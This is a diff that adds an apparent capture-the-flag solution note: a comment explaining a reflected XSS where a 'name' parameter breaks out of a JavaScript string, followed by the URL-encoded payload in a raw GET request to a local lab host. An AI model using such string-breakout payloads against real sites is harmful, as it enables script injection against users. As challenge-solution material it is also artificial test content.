@@ -1,0 +1,4 @@
+# Reflected XSS: name param injected into JS string. Payload ";alert('XSS')// breaks out of string literal. Server confirms XSS and returns CTF flag.
+
+GET /page?name=%22%3Balert(%27XSS%27)%2F%2F HTTP/1.1
+Host: 172.17.0.1:50197
